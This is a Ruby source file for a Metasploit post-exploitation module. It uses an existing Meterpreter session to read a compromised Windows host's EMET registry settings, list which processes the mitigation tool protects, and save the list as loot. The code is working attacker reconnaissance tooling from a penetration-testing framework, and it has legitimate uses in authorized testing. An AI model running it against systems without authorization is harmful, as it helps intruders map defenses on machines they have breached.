##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/post/common'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Post::Common

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Windows Gather EMET Protected Paths',
      'Description'   => %q( This module will enumerate the EMET protected paths on the target host.),
      'License'       => MSF_LICENSE,
      'Author'        => [ 'vysec <vincent.yiu[at]mwrinfosecurity.com>' ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))
  end

  def print_status(msg='')
    super("#{peer} - #{msg}")
  end

  def print_good(msg='')
    super("#{peer} - #{msg}")
  end

  def run
    reg_view = sysinfo['Architecture'] =~ /x64/ ? REGISTRY_VIEW_64_BIT : REGISTRY_VIEW_32_BIT
    reg_vals = registry_enumvals('HKLM\\SOFTWARE\\Microsoft\\EMET\\AppSettings', reg_view)
    if reg_vals.nil?
      print_error('Failed to enumerate EMET Protected.')
    else
      print_status('Found protected processes:')
      reg_vals.each do |path|
        print_status(path)
      end
      path = store_loot('host.emet_paths', 'text/plain', session, reg_vals.join("\r\n"), 'emet_paths.txt', 'EMET Paths')
      print_good("Results stored in: #{path}")
    end
  end
end
